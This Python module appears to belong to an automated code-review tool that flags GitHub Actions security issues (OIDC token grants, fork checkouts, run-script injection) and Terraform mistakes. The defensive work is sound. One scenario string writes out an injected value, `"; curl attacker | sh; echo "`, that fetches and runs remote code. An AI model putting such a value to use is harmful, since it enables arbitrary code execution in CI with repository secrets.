"""GitHub Actions workflow and Terraform structural fact extractors for `autoreview_reference`."""
from __future__ import annotations

import re
from typing import Any

from autoreview_reference_types import (
    TfBlock,
    YamlNode,
    _clip,
    _TF,
    _TF_BLOCK,
    _WORKFLOW,
)

_OIDC_USERS = re.compile(
    r"configure-aws-credentials|google-github-actions/auth|azure/login|actions/attest|sigstore|"
    r"slsa-framework|pypa/gh-action-pypi-publish|cosign|actions/deploy-pages|aws-actions/",
    re.I,
)
_OIDC_RUN = re.compile(r"--provenance|gh attestation|id-token|ACTIONS_ID_TOKEN_REQUEST", re.I)
_USER_CONTROLLED = re.compile(
    r"\$\{\{\s*(?:github\.event\.(?:issue|comment|pull_request|review|review_comment|discussion|"
    r"commits\[[^\]]*\]|head_commit|inputs)\.[\w.\[\]]*(?:title|body|message|name|ref|label|email|"
    r"login|default_branch|description)|github\.head_ref|inputs\.[\w.]+|"
    r"github\.event\.inputs\.[\w.]+)\s*\}\}",
    re.I,
)
_SAME_REPO_GUARD = re.compile(
    r"head\.repo\.full_name\s*==\s*github\.repository|head\.repo\.fork\s*==\s*false|"
    r"!\s*github\.event\.pull_request\.head\.repo\.fork|repo\.owner\.login\s*==|"
    r"github\.repository_owner\s*==",
    re.I,
)
_RISKY_TRIGGERS = {
    "pull_request_target",
    "issue_comment",
    "pull_request_review",
    "pull_request_review_comment",
}


def _repo_lines(reference: Any, path: str) -> list[str]:
    lines = reference.repo.lines(path)
    return lines if lines is not None else []


def _permissions(value: Any) -> dict[str, str]:
    if isinstance(value, dict):
        return {str(key): str(item) for key, item in value.items() if item is not None}
    return {}


def _workflow_trigger_names(doc: dict[str, Any]) -> list[str]:
    triggers = doc.get("on") if doc.get("on") is not None else doc.get(True)
    if isinstance(triggers, dict):
        return [str(key) for key in triggers]
    if isinstance(triggers, list):
        return [str(item) for item in triggers]
    if isinstance(triggers, str):
        return [triggers]
    return []


def _line_of_pattern(
    text_lines: list[str],
    pattern: str,
    start: int = 1,
    end: int | None = None,
) -> int | None:
    limit = min(end or len(text_lines), len(text_lines))
    for number in range(start, limit + 1):
        if re.search(pattern, text_lines[number - 1]):
            return number
    return None


def _step_uses_oidc(step: Any) -> bool:
    if not isinstance(step, dict):
        return False
    uses = step.get("uses")
    run_cmd = step.get("run")
    if isinstance(uses, str) and _OIDC_USERS.search(uses):
        return True
    return isinstance(run_cmd, str) and bool(_OIDC_RUN.search(run_cmd))


def _scan_job_oidc(reference: Any, job: dict[str, Any]) -> tuple[bool, str | None]:
    uses = job.get("uses")
    if isinstance(uses, str):
        if uses.startswith("./"):
            called_path = uses.split("@")[0].lstrip("./")
            called_lines = _repo_lines(reference, called_path)
            return any(re.search(r"id-token", line) for line in called_lines), None
        # A reusable workflow elsewhere: unknown, assume it may need it.
        return True, uses
    steps = job.get("steps")
    if isinstance(steps, list) and any(_step_uses_oidc(step) for step in steps):
        return True, None
    return False, None


def _scan_workflow_oidc(reference: Any, jobs: dict[str, Any]) -> tuple[bool, list[str]]:
    uses_oidc = False
    external_calls: list[str] = []
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        job_oidc, external = _scan_job_oidc(reference, job)
        uses_oidc = uses_oidc or job_oidc
        if external is not None:
            external_calls.append(external)
    return uses_oidc, external_calls


def _collect_id_token_grants(
    top_permissions: dict[str, str],
    top_line: int | None,
    jobs: dict[str, Any],
    text_lines: list[str],
) -> list[int]:
    grants: list[int] = []
    if top_permissions.get("id-token") == "write" and top_line:
        found = _line_of_pattern(text_lines, r"id-token:\s*write", top_line, top_line + 12)
        grants.append(found or top_line)
    for job in jobs.values():
        if isinstance(job, dict) and _permissions(job.get("permissions")).get("id-token") == "write":
            grants.append(_line_of_pattern(text_lines, r"id-token:\s*write") or 1)
    return grants


def _unused_id_token_fact(reference: Any, path: str, line: int) -> dict[str, Any]:
    return {
        "id": reference._id("W", f"{path}:idtoken:{line}"),
        "kind": "workflow",
        "shape": "idtoken",
        "path": path,
        "line": line,
        "cite": [(path, line)],
        "text": (
            f"{path}:{line} grants `id-token: write`, but no step uses an OIDC action or command "
            "(configure-aws-credentials, google-github-actions/auth, azure/login, attestations, "
            "--provenance): the permission is unnecessary."
        ),
        "finding": {
            "level": "low",
            "severity": "minor",
            "finder_level": "low",
            "category": "security",
            "claim": "The workflow grants `id-token: write` although no step requests an OIDC token.",
            "why": (
                "An unused `id-token: write` widens what a compromised step can do (it can mint "
                "identity tokens for cloud providers); the least privilege is not to grant it."
            ),
            "scenario": "",
            "suggested_fix": (
                "Remove `id-token: write` from the permissions, or scope it to the job that "
                "authenticates with OIDC."
            ),
            "unpinned": None,
            "consequence": "",
        },
    }


def _external_id_token_fact(reference: Any, path: str, line: int, called: str) -> dict[str, Any]:
    mutable = bool(re.search(r"@(main|master|develop|v?\d+)$", called))
    mutable_note = " (a mutable ref)" if mutable else ""
    mutable_why = ", which can change under the mutable ref," if mutable else ""
    mutable_fix = ", and pin the reference to a commit SHA." if mutable else "."
    return {
        "id": reference._id("W", f"{path}:idtoken-external:{line}"),
        "kind": "workflow",
        "shape": "idtoken-external",
        "path": path,
        "line": line,
        "cite": [(path, line)],
        "text": (
            f"{path}:{line} grants `id-token: write` to the external reusable workflow `{called}`"
            f"{mutable_note}: nothing in this repository shows that workflow needs an OIDC token."
        ),
        "finding": {
            "level": "low",
            "severity": "minor",
            "finder_level": "low",
            "category": "security",
            "claim": (
                f"The workflow grants `id-token: write` to the external reusable workflow `{called}`."
            ),
            "why": (
                "The caller's permissions are the ceiling of the called workflow: with `id-token: write` "
                f"the code behind that reference{mutable_why} can mint OIDC identity tokens for cloud "
                "providers as this repository, whether or not it needs them today."
            ),
            "scenario": "",
            "suggested_fix": (
                "Grant only what the called workflow documents it needs; drop `id-token: write` "
                f"unless it authenticates with OIDC{mutable_fix}"
            ),
            "unpinned": None,
            "consequence": "",
        },
    }


def _workflow_id_token_facts(
    reference: Any,
    path: str,
    changed: set[int],
    added_file: bool,
    uses_oidc: bool,
    external_calls: list[str],
    grants: list[int],
) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for line in grants:
        if not (added_file or line in changed):
            continue
        if not uses_oidc:
            out.append(_unused_id_token_fact(reference, path, line))
        elif external_calls:
            out.append(_external_id_token_fact(reference, path, line, external_calls[0]))
    return out


def _siblings_with_permissions(reference: Any, path: str) -> list[str]:
    siblings = [other for other in reference.repo.files() if _WORKFLOW.search(other) and other != path]
    out: list[str] = []
    for other in siblings:
        lines = _repo_lines(reference, other)
        if any(re.match(r"^\s*permissions:", line) for line in lines):
            out.append(other)
    return out


def _has_job_permissions(jobs: dict[str, Any]) -> bool:
    return any(isinstance(job, dict) and job.get("permissions") for job in jobs.values())


def _missing_permissions_fact(
    reference: Any,
    path: str,
    line: int,
    sibling: str,
    sibling_line: int,
    count: int,
) -> dict[str, Any]:
    return {
        "id": reference._id("W", f"{path}:permissions"),
        "kind": "workflow",
        "shape": "permissions",
        "path": path,
        "line": line,
        "cite": [(path, line), (sibling, sibling_line)],
        "text": (
            f"{path} declares no `permissions` block, while {count} sibling "
            f"workflows do (for example {sibling}:{sibling_line}): GITHUB_TOKEN keeps the "
            "repository's default permissions here."
        ),
        "finding": {
            "level": "low",
            "severity": "minor",
            "finder_level": "low",
            "category": "security",
            "claim": (
                "The workflow sets no `permissions`, unlike its sibling workflows, so "
                "GITHUB_TOKEN runs with the repository default permissions."
            ),
            "why": (
                f"{count} other workflows in .github/workflows restrict "
                "GITHUB_TOKEN explicitly; this one does not, so its token may have write "
                "access it does not need."
            ),
            "scenario": "",
            "suggested_fix": (
                "Add a top-level `permissions:` block with the least the jobs need "
                "(for example `contents: read`)."
            ),
            "unpinned": None,
            "consequence": "",
        },
    }


def _workflow_missing_permissions_facts(
    reference: Any,
    path: str,
    node: YamlNode,
    jobs: dict[str, Any],
    top_permissions: dict[str, str],
    changed: set[int],
    added_file: bool,
) -> list[dict[str, Any]]:
    if not jobs or top_permissions or _has_job_permissions(jobs):
        return []
    with_permissions = _siblings_with_permissions(reference, path)
    jobs_line = node.lines.get("jobs") or 0
    if len(with_permissions) < 2 or not (added_file or jobs_line in changed):
        return []
    sibling = with_permissions[0]
    sibling_lines = _repo_lines(reference, sibling)
    sibling_line = _line_of_pattern(sibling_lines, r"^\s*permissions:") or 1
    return [
        _missing_permissions_fact(
            reference, path, jobs_line or 1, sibling, sibling_line, len(with_permissions)
        )
    ]


def _checkout_ref(step: dict[str, Any]) -> str:
    uses = step.get("uses")
    step_with = step.get("with")
    if not (isinstance(uses, str) and uses.startswith("actions/checkout") and isinstance(step_with, dict)):
        return ""
    ref = str(step_with.get("ref") or "")
    return ref if re.search(r"head\.(sha|ref)|head_ref", ref) else ""


def _near_changed(line: int, changed: set[int], added_file: bool) -> bool:
    if added_file or line in changed:
        return True
    return any(number in changed for number in range(max(1, line - 3), line + 3))


def _fork_checkout_fact(
    reference: Any,
    path: str,
    job_name: str,
    line: int,
    risky: list[str],
) -> dict[str, Any]:
    return {
        "id": reference._id("W", f"{path}:fork:{job_name}"),
        "kind": "workflow",
        "shape": "fork-checkout",
        "path": path,
        "line": line,
        "cite": [(path, line)],
        "text": (
            f"{path}:{line} ({job_name}) runs on {', '.join(risky)} and checks out the pull "
            "request head without a same-repository guard "
            "(no `head.repo.full_name == github.repository` condition)."
        ),
        "finding": {
            "level": "medium",
            "severity": "minor",
            "finder_level": "medium",
            "category": "security",
            "claim": (
                f"Job {job_name} checks out the pull request head under a {risky[0]} trigger "
                "without a same-repository guard."
            ),
            "why": (
                f"{risky[0]} runs with the base repository's GITHUB_TOKEN and secrets; checking "
                "out a fork's head and running its code lets a fork's pull request run arbitrary "
                "code with that token."
            ),
            "scenario": (
                "A pull request from a fork modifies a script this job runs after checkout; "
                "the job executes it with the repository's token and secrets."
            ),
            "suggested_fix": (
                "Guard the job with `if: github.event.pull_request.head.repo.full_name == "
                "github.repository`, or use the `pull_request` trigger for untrusted code."
            ),
            "unpinned": None,
            "consequence": "",
        },
    }


def _unguarded_checkout_line(
    step: dict[str, Any],
    guard_texts: list[str],
    text_lines: list[str],
) -> int | None:
    guard_texts.append(str(step.get("if") or ""))
    ref = _checkout_ref(step)
    if not ref or any(_SAME_REPO_GUARD.search(text) for text in guard_texts):
        return None
    pattern = re.escape(ref.split("}}")[0][-30:])
    return _line_of_pattern(text_lines, pattern) or _line_of_pattern(text_lines, r"actions/checkout") or 1


def _job_fork_checkout_facts(
    reference: Any,
    path: str,
    job_name: str,
    job: dict[str, Any],
    risky: list[str],
    changed: set[int],
    added_file: bool,
    text_lines: list[str],
) -> list[dict[str, Any]]:
    steps = job.get("steps")
    if not isinstance(steps, list):
        return []
    out: list[dict[str, Any]] = []
    guard_texts = [str(job.get("if") or "")]
    for step in steps:
        if not isinstance(step, dict):
            continue
        line = _unguarded_checkout_line(step, guard_texts, text_lines)
        if line is not None and _near_changed(line, changed, added_file):
            out.append(_fork_checkout_fact(reference, path, job_name, line, risky))
    return out


def _workflow_fork_checkout_facts(
    reference: Any,
    path: str,
    jobs: dict[str, Any],
    trigger_names: list[str],
    changed: set[int],
    added_file: bool,
    text_lines: list[str],
) -> list[dict[str, Any]]:
    risky = [name for name in trigger_names if name in _RISKY_TRIGGERS]
    if not risky:
        return []
    out: list[dict[str, Any]] = []
    for job_name, job in jobs.items():
        if isinstance(job, dict):
            out.extend(
                _job_fork_checkout_facts(
                    reference, path, job_name, job, risky, changed, added_file, text_lines
                )
            )
    return out


def _injection_fact(
    reference: Any,
    path: str,
    job_name: str,
    line: int,
    expression: str,
) -> dict[str, Any]:
    return {
        "id": reference._id("W", f"{path}:inject:{line}"),
        "kind": "workflow",
        "shape": "run-injection",
        "path": path,
        "line": line,
        "cite": [(path, line)],
        "text": (
            f"{path}:{line} ({job_name}) interpolates `{_clip(expression, 80)}` into a run "
            "script: the value is user-controlled and is substituted before the shell parses it."
        ),
        "finding": {
            "level": "medium",
            "severity": "minor",
            "finder_level": "medium",
            "category": "security",
            "claim": (
                f"A run step interpolates the user-controlled expression "
                f"`{_clip(expression, 70)}` directly into the shell script."
            ),
            "why": (
                "GitHub substitutes `${{ }}` expressions into the script text before the shell "
                "runs it, so quotes and `$()` in the value become shell syntax."
            ),
            "scenario": (
                "A pull request title (or body, branch name, comment) containing "
                '`"; curl attacker | sh; echo "` runs that command in the job.'
            ),
            "suggested_fix": (
                "Pass the value through an environment variable (`env: TITLE: ${{ ... }}`) "
                'and reference `"$TITLE"` in the script.'
            ),
            "unpinned": None,
            "consequence": "",
        },
    }


def _job_injection_facts(
    reference: Any,
    path: str,
    job_name: str,
    job: dict[str, Any],
    changed: set[int],
    added_file: bool,
    text_lines: list[str],
) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    steps = job.get("steps")
    if not isinstance(steps, list):
        return out
    for step in steps:
        if not isinstance(step, dict) or not isinstance(step.get("run"), str):
            continue
        match = _USER_CONTROLLED.search(step["run"])
        if not match:
            continue
        expression = match.group(0)
        line = _line_of_pattern(text_lines, re.escape(expression[:40]))
        if line is not None and (added_file or line in changed):
            out.append(_injection_fact(reference, path, job_name, line, expression))
    return out


def _workflow_injection_facts(
    reference: Any,
    path: str,
    jobs: dict[str, Any],
    changed: set[int],
    added_file: bool,
    text_lines: list[str],
) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for job_name, job in jobs.items():
        if isinstance(job, dict):
            out.extend(
                _job_injection_facts(reference, path, job_name, job, changed, added_file, text_lines)
            )
    return out


def _is_added_file(reference: Any, path: str) -> bool:
    return all(
        line.kind == "+"
        for item in reference.files
        if item.path == path
        for hunk in item.hunks
        for line in hunk.lines
    )


def _workflow_facts(reference: Any, path: str, node: YamlNode) -> list[dict[str, Any]]:
    doc = node.value
    changed = reference.changed_lines.get(path, set())
    added_file = _is_added_file(reference, path)
    jobs = doc.get("jobs") if isinstance(doc.get("jobs"), dict) else {}
    trigger_names = _workflow_trigger_names(doc)
    top_permissions = _permissions(doc.get("permissions"))
    text_lines = _repo_lines(reference, path)

    uses_oidc, external_calls = _scan_workflow_oidc(reference, jobs)
    grants = _collect_id_token_grants(
        top_permissions, node.lines.get("permissions"), jobs, text_lines
    )

    out: list[dict[str, Any]] = []
    out.extend(
        _workflow_id_token_facts(
            reference, path, changed, added_file, uses_oidc, external_calls, grants
        )
    )
    out.extend(
        _workflow_missing_permissions_facts(
            reference, path, node, jobs, top_permissions, changed, added_file
        )
    )
    out.extend(
        _workflow_fork_checkout_facts(
            reference, path, jobs, trigger_names, changed, added_file, text_lines
        )
    )
    out.extend(_workflow_injection_facts(reference, path, jobs, changed, added_file, text_lines))
    return out


def _find_block_line(reference: Any, block: TfBlock, needle: str) -> int:
    source_lines = _repo_lines(reference, block.path)
    for number, source in enumerate(source_lines, 1):
        if block.line <= number <= block.end and needle in source:
            return number
    return block.line


def _removed_tf_blocks(reference: Any) -> list[tuple[str, str, str]]:
    removed: list[tuple[str, str, str]] = []
    for item in reference.files:
        if not _TF.search(item.path):
            continue
        for text in reference.removed_text.get(item.path, []):
            match = _TF_BLOCK.match(text)
            if not match or match.group(1) not in ("resource", "data"):
                continue
            kind = match.group(1)
            prefix = "" if kind == "resource" else "data."
            address = f"{prefix}{match.group(2)}.{match.group(3)}"
            removed.append((item.path, kind, address))
    return removed


def _removed_ref_fact(
    reference: Any,
    removed_path: str,
    address: str,
    block: TfBlock,
    line: int,
) -> dict[str, Any]:
    return {
        "id": reference._id("T", f"ref:{address}:{block.path}"),
        "kind": "terraform",
        "shape": "tf-removed-ref",
        "path": block.path,
        "line": line,
        "cite": [(block.path, line)],
        "text": (
            f"The change removes `{address}` from {removed_path}, "
            f"but {block.path}:{line} ({block.address}) still references it."
        ),
        "finding": {
            "level": "medium",
            "severity": "minor",
            "finder_level": "medium",
            "category": "correctness",
            "claim": f"`{block.address}` still references `{address}`, which this change removes.",
            "why": "A reference to a resource that no longer exists fails at plan time.",
            "scenario": (
                f"`terraform plan` fails: `{address}` is referenced by {block.address} "
                "but is not declared."
            ),
            "suggested_fix": f"Update or remove the reference in {block.path}, or keep `{address}`.",
            "unpinned": None,
            "consequence": "",
        },
    }


def _tf_removed_resource_facts(reference: Any, all_blocks: list[TfBlock]) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    present_addresses = {block.address for block in all_blocks}
    for removed_path, kind, address in _removed_tf_blocks(reference):
        if address in present_addresses:
            continue  # moved, not removed
        still = [
            block
            for block in all_blocks
            if address in block.refs and not (block.kind == kind and block.address == address)
        ]
        for block in still[:3]:
            line = _find_block_line(reference, block, address)
            out.append(_removed_ref_fact(reference, removed_path, address, block, line))
    return out


def _has_prevent_destroy(block: TfBlock) -> bool:
    lifecycle = block.nested.get("lifecycle")
    if not lifecycle:
        return False
    return lifecycle.get("prevent_destroy", "").strip() == "true"


def _prevent_destroy_fact(
    reference: Any,
    path: str,
    block: TfBlock,
    protected: list[TfBlock],
    other_line: int,
) -> dict[str, Any]:
    other = protected[0]
    return {
        "id": reference._id("T", f"protect:{block.address}"),
        "kind": "terraform",
        "shape": "tf-prevent-destroy",
        "path": path,
        "line": block.line,
        "cite": [(path, block.line), (other.path, other_line)],
        "text": (
            f"{path}:{block.line} adds `{block.address}` without `lifecycle {{ prevent_destroy = true }}`, "
            f"which {len(protected)} sibling resources of type {block.type} set "
            f"(for example {other.address} at {other.path}:{other_line})."
        ),
        "finding": {
            "level": "low",
            "severity": "minor",
            "finder_level": "low",
            "category": "correctness",
            "claim": (
                f"`{block.address}` lacks the `prevent_destroy` lifecycle rule its sibling "
                f"{block.type} resources set."
            ),
            "why": (
                "Sibling resources of the same type are protected from accidental destruction; "
                "this one is not, so a plan that replaces it destroys it."
            ),
            "scenario": "",
            "suggested_fix": (
                "Add `lifecycle { prevent_destroy = true }` as the siblings do, "
                "or state why this resource may be destroyed."
            ),
            "unpinned": None,
            "consequence": "",
        },
    }


def _protected_siblings(block: TfBlock, all_blocks: list[TfBlock]) -> list[TfBlock]:
    return [
        other
        for other in all_blocks
        if other.kind == "resource"
        and other.type == block.type
        and other.address != block.address
        and _has_prevent_destroy(other)
    ]


def _tf_prevent_destroy_facts(reference: Any, all_blocks: list[TfBlock]) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for path, blocks in reference.terraform.items():
        changed = reference.changed_lines.get(path, set())
        for block in blocks:
            if block.kind != "resource" or block.line not in changed or _has_prevent_destroy(block):
                continue
            protected = _protected_siblings(block, all_blocks)
            if len(protected) < 2:
                continue
            other_line = _find_block_line(reference, protected[0], "prevent_destroy")
            out.append(_prevent_destroy_fact(reference, path, block, protected, other_line))
    return out


def _terraform_facts(reference: Any) -> list[dict[str, Any]]:
    all_blocks = [block for blocks in reference.terraform.values() for block in blocks]
    if not all_blocks:
        return []
    removed = _tf_removed_resource_facts(reference, all_blocks)
    unprotected = _tf_prevent_destroy_facts(reference, all_blocks)
    return removed + unprotected
